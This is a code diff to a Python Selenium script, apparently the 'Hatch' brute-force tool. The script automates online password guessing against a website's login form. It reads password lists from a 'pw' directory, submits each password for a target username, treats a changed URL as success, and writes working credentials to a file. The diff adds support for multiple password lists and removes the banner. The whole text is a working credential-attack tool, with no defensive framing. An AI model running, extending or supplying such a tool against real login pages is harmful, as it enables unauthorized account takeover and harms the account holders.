@@ -1,3 +1,4 @@
+import os
 import requests
 import time as t
 import logging
@@ -60,7 +61,23 @@ def log_valid_credential(username, password):
     with open('valid_credentials.txt', 'a') as f:
         f.write(f"{username}: {password}\n")
 
-def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
+def get_password_lists():
+    """Retrieve all .txt files in the 'pw' directory, sorted by size."""
+    pw_dir = 'pw'
+    if not os.path.exists(pw_dir):
+        logging.error(f"'{pw_dir}' directory not found.")
+        return []
+
+    # Retrieve all .txt files and sort them by size
+    password_lists = sorted(
+        [os.path.join(pw_dir, f) for f in os.listdir(pw_dir) if f.endswith('.txt')],
+        key=lambda x: os.path.getsize(x),
+        reverse=True
+    )
+
+    return password_lists
+
+def brutes(username, username_selector, password_selector, login_btn_selector, password_lists, website):
     options = Options()
     options.add_argument("--disable-popup-blocking")
     options.add_argument("--disable-extensions")
@@ -68,47 +85,52 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
     service = Service(CHROME_DVR_DIR)
     browser = webdriver.Chrome(service=service, options=options)
 
-    with open(pass_list, 'r') as f:
-        passwords = f.readlines()
-
-    for password in passwords:
+    for pass_path in password_lists:
         try:
-            browser.get(website)
-            t.sleep(2)
+            with open(pass_path, 'r') as f:
+                passwords = f.readlines()
 
-            Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
-            Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
-            enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)
+        except FileNotFoundError:
+            logging.error(f"Password list {os.path.basename(pass_path)} not found in 'pw' directory.")
+            continue
 
-            Sel_user.send_keys(username)
-            Sel_pas.send_keys(password.strip())
+        for password in passwords:
+            try:
+                browser.get(website)
+                t.sleep(2)
 
-            enter.click()
-            t.sleep(5)
+                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
+                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
+                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)
 
-            # Check login success and log valid credentials
-            if browser.current_url != website:
-                logging.info(f"Valid credentials found: {username} / {password.strip()}")
-                log_valid_credential(username, password.strip())
+                Sel_user.send_keys(username)
+                Sel_pas.send_keys(password.strip())
+
+                enter.click()
+                t.sleep(5)
+
+                # Check login success and log valid credentials
+                if browser.current_url != website:
+                    logging.info(f"Valid credentials found: {username} / {password.strip()}")
+                    log_valid_credential(username, password.strip())
+                    exit()
+
+                logging.info(f"Tried password: {password.strip()} for user: {username}")
+            except NoSuchElementException:
+                logging.error("An element is missing, which could indicate either the password was found or you are locked out.")
+                exit()
+            except InvalidSelectorException:
+                logging.error("An invalid selector was used. Check the selectors again.")
+                exit()
+            except WebDriverException:
+                logging.error("An error occurred with WebDriver.")
+                browser.quit()
+                exit()
+            except KeyboardInterrupt:
+                logging.error("User interrupted with Ctrl-C.")
                 exit()
 
-            logging.info(f"Tried password: {password.strip()} for user: {username}")
-        except NoSuchElementException:
-            logging.error("An element is missing, which could indicate either the password was found or you are locked out.")
-            exit()
-        except InvalidSelectorException:
-            logging.error("An invalid selector was used. Check the selectors again.")
-            exit()
-        except WebDriverException as e:
-            logging.error(f"WebDriver error: {str(e)}")
-            browser.quit()
-            exit()
-        except KeyboardInterrupt:
-            logging.error("User interrupted with Ctrl-C.")
-            exit()
-
 def wizard():
-    print(banner)
     web_info = read_web_info()
 
     website = web_info.get('website')
@@ -120,44 +142,34 @@ def wizard():
         return
 
     target_username = web_info.get('target_username', '')
-    password_list = web_info.get('password_list', '')
+    password_lists = get_password_lists()
 
     brutes(
         target_username,
         web_info['username_selector'],
         web_info['password_selector'],
         web_info['login_button_selector'],
-        password_list,
+        password_lists,
         website
     )
-
-# Text Art:
-banner = Color.BOLD + Color.RED +'''
-  _    _       _       _
- | |  | |     | |     | |
- | |__| | __ _| |_ ___| |__
- |  __  |/ _` | __/ __| '_ \\
- | |  | | (_| | || (__| | | |
- |_|  |_|\__,_|\__\___|_| |_|
-'''
 
 # Argument parsing
 parser = OptionParser()
 parser.add_option("-u", "--username", dest="username", help="Choose the username")
-parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
+parser.add_option("--passlists", dest="passlists", help="Comma-separated list of password files")
 parser.add_option("--website", help="Choose a website")
 (options, args) = parser.parse_args()
 
-if not (options.website and options.passlist):
+if not (options.website and options.passlists):
     wizard()
 else:
-    print(banner)
     web_info = read_web_info()
+    password_lists = get_password_lists() if not options.passlists else options.passlists.split(',')
     brutes(
         web_info.get('target_username', ''),
         web_info['username_selector'],
         web_info['password_selector'],
         web_info['login_button_selector'],
-        options.passlist,
+        password_lists,
         options.website
     )
